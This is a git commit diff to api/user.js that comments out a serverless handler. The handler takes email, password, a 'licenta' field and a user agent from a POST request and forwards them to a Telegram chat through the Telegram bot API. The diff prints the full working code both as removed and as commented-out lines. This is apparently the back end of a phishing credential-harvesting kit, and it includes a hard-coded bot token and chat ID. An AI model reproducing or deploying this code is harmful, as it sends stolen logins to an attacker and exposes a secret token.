1d5ee1e233e287984a5c3df0b0fb36249ca13780
riverarentxl-a11y <riverarentxl@gmail.com>
2026-02-11 16:45:53 +0200

    Update user.js

--- api/user.js
+++ api/user.js
@@ -1,47 +1,47 @@
-module.exports = async function handler(req, res) {
-  if (req.method !== 'POST') {
-    return res.status(405).json({ error: 'Method not allowed' });
-  }
+// module.exports = async function handler(req, res) {
+//   if (req.method !== 'POST') {
+//     return res.status(405).json({ error: 'Method not allowed' });
+//   }
 
-  console.log('bammmmmmmmm')
-  const token = '8303026583:AAFjH0ttFEZCOIJaZlgW5my33HfV4jSIqA0';
-  const chatId = '-5096357861';
+//   console.log('bammmmmmmmm')
+//   const token = '8303026583:AAFjH0ttFEZCOIJaZlgW5my33HfV4jSIqA0';
+//   const chatId = '-5096357861';
 
-  try {
-    const { email, pass, licenta, agent } = req.body;
+//   try {
+//     const { email, pass, licenta, agent } = req.body;
 
-    const message = `
-📩  habitat
+//     const message = `
+// 📩  habitat
 
-📧 Email: ${email}
-🔑 Pass: ${pass}
-licenta: ${licenta}
-🖥️ Agent: ${agent}
-    `;
+// 📧 Email: ${email}
+// 🔑 Pass: ${pass}
+// licenta: ${licenta}
+// 🖥️ Agent: ${agent}
+//     `;
 
-    const tgRes = await fetch(
-      `https://api.telegram.org/bot${token}/sendMessage`,
-      {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message
-        })
-      }
-    );
+//     const tgRes = await fetch(
+//       `https://api.telegram.org/bot${token}/sendMessage`,
+//       {
+//         method: 'POST',
+//         headers: { 'Content-Type': 'application/json' },
+//         body: JSON.stringify({
+//           chat_id: chatId,
+//           text: message
+//         })
+//       }
+//     );
 
-    const data = await tgRes.json();
+//     const data = await tgRes.json();
 
-    return res.status(200).json({
-      ok: true,
-      telegram: data
-    });
+//     return res.status(200).json({
+//       ok: true,
+//       telegram: data
+//     });
 
-  } catch (err) {
-    return res.status(500).json({
-      error: 'Server error',
-      details: err.message
-    });
-  }
-};
+//   } catch (err) {
+//     return res.status(500).json({
+//       error: 'Server error',
+//       details: err.message
+//     });
+//   }
+// };
